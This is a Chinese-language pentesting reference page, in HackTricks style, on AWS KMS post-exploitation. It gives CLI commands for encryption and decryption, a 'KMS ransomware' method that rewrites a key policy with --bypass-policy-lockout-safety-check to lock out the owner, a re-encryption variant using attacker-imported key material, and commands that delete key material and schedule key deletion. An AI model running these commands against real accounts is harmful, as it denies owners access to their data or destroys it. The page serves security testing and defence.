# AWS - KMS 后期利用

{{#include ../../../banners/hacktricks-training.md}}

## KMS

有关更多信息，请查看：

{{#ref}}
../aws-services/aws-kms-enum.md
{{#endref}}

### 加密/解密信息

`fileb://` 和 `file://` 是在 AWS CLI 命令中用于指定本地文件路径的 URI 方案：

- `fileb://:` 以二进制模式读取文件，通常用于非文本文件。
- `file://:` 以文本模式读取文件，通常用于纯文本文件、脚本或没有特殊编码要求的 JSON。

> [!TIP]
> 请注意，如果您想解密文件中的某些数据，文件必须包含二进制数据，而不是 base64 编码的数据。 (fileb://)

- 使用 **对称** 密钥
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- 使用**非对称**密钥：
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS 勒索软件

拥有 KMS 特权访问权限的攻击者可以修改密钥的 KMS 策略并**授予他的账户访问权限**，同时移除授予合法账户的访问权限。

然后，合法账户的用户将无法访问任何使用这些密钥加密的服务的信息，从而在账户上创建一个简单但有效的勒索软件。

> [!WARNING]
> 请注意，**AWS 管理的密钥不受此攻击影响**，只有**客户管理的密钥**。

> 还要注意需要使用参数 **`--bypass-policy-lockout-safety-check`**（在网页控制台中缺少此选项使得此攻击仅能通过 CLI 实现）。
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> 注意，如果您更改该策略并仅向外部帐户授予访问权限，然后从该外部帐户尝试设置新策略以**将访问权限恢复到原始帐户，您将无法做到，因为无法从跨帐户执行 Put Policy 操作**。

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### 通用 KMS 勒索软件

#### 全球 KMS 勒索软件

还有另一种执行全球 KMS 勒索软件的方法，涉及以下步骤：

- 创建一个**由攻击者导入的密钥材料的新密钥**
- **使用新密钥重新加密以前版本加密的旧数据**
- **删除 KMS 密钥**
- 现在只有拥有原始密钥材料的攻击者才能解密加密数据

### 销毁密钥
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> 请注意，AWS 现在**阻止从跨账户执行之前的操作：**

<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../banners/hacktricks-training.md}}
